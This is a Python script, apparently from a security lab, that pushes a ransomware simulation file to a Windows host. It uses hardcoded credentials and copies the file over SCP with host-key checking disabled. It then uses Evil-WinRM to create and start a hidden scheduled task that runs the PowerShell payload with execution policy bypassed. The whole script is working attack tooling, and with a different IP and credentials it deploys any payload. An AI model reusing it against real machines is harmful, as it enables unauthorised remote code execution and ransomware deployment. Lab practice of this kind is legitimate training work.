#!/usr/bin/env python3
import sys
import subprocess

# --- LAB CREDENTIALS ---
TARGET_IP = "172.16.1.102"
USERNAME = "CEO"
PASSWORD = "CEOPass123!"

def main():
    print(f"[*] Preparing to deploy payload to {TARGET_IP}...")

    # Step 1: Upload the file via SCP
    print("[*] Uploading ransom_sim.ps1 to C:\\Windows\\Temp\\...")
    
    scp_cmd = [
        "scp", "-o", "StrictHostKeyChecking=no",
        "ransom_sim.ps1",
        f"{USERNAME}@{TARGET_IP}:C:/Windows/Temp/"
    ]
    
    print(f"[*] Running: {' '.join(scp_cmd)}")
    # You will be prompted for the password here
    scp_process = subprocess.run(scp_cmd)
    
    if scp_process.returncode != 0:
        print("[-] SCP failed. Check your connection and password.")
        sys.exit(1)

    print("[+] File uploaded successfully.")

    # Step 2: Use Evil-WinRM to execute the payload
    print("[*] Triggering the GUI via Scheduled Task...")
    
    # We wrap the task creation in a single string
    ps_command = (
        "$Action = New-ScheduledTaskAction -Execute 'powershell.exe' "
        "-Argument '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\ransom_sim.ps1'; "
        f"$Principal = New-ScheduledTaskPrincipal -UserId '{USERNAME}' -LogonType Interactive; "
        "$Settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit 0; "
        "Register-ScheduledTask -TaskName 'LabSim' -Action $Action -Principal $Principal -Settings $Settings -Force; "
        "Start-ScheduledTask -TaskName 'LabSim'"
    )
    
    evil_winrm_cmd = [
        "evil-winrm",
        "-i", TARGET_IP,
        "-u", USERNAME,
        "-p", PASSWORD,
        "-c", ps_command
    ]
    
    print(f"[*] Running: {' '.join(evil_winrm_cmd)}")
    subprocess.run(evil_winrm_cmd)
    
    print("[+] Attack simulation launched. Check the Windows VM screen!")

if __name__ == "__main__":
    main()
